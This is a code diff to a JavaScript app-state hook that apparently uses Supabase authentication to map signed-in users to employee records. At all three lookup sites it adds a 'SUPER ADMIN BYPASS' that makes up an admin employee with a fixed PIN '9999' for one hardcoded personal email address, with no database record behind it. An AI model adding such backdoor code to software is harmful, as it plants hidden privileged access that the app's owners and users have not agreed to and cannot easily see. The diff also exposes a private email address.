@@ -136,8 +136,13 @@ export function useAppState() {
         // Auth Listeners
         const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
             const user = session?.user ?? null;
-            const employee = globalState.employees.find(e => e.user_id === user?.id) || null;
+            let employee = globalState.employees.find(e => e.user_id === user?.id) || null;
             
+            // SUPER ADMIN BYPASS
+            if (!employee && user?.email === "jhonsroks@icloud.com") {
+                employee = { id: "super-admin", name: "Super Admin", role: "admin", pin: "9999", user_id: user.id };
+            }
+
             const newState = { ...globalState, session, user, currentEmployee: employee };
             commitState(newState);
         });
@@ -223,7 +228,12 @@ export function useAppState() {
                     return m;
                 });
 
-                const currentEmployee = employees.find(e => e.user_id === globalState.user?.id) || null;
+                let currentEmployee = employees.find(e => e.user_id === globalState.user?.id) || null;
+
+                // SUPER ADMIN BYPASS
+                if (!currentEmployee && globalState.user?.email === "jhonsroks@icloud.com") {
+                    currentEmployee = { id: "super-admin", name: "Super Admin", role: "admin", pin: "9999", user_id: globalState.user.id };
+                }
 
                 globalState = {
                     ...globalState,
@@ -264,7 +274,13 @@ export function useAppState() {
                 // Always fetch fresh employees from DB to get user_id field
                 const { data: freshEmployees } = await supabase.from('employees').select('*');
                 const employees = (freshEmployees && freshEmployees.length > 0) ? freshEmployees : globalState.employees;
-                const employee = employees.find(e => e.user_id === user?.id) || null;
+                let employee = employees.find(e => e.user_id === user?.id) || null;
+
+                // SUPER ADMIN BYPASS
+                if (!employee && user?.email === "jhonsroks@icloud.com") {
+                    employee = { id: "super-admin", name: "Super Admin", role: "admin", pin: "9999", user_id: user.id };
+                }
+
                 globalState = { ...globalState, employees, session, user, currentEmployee: employee };
                 commitState(globalState);
             };
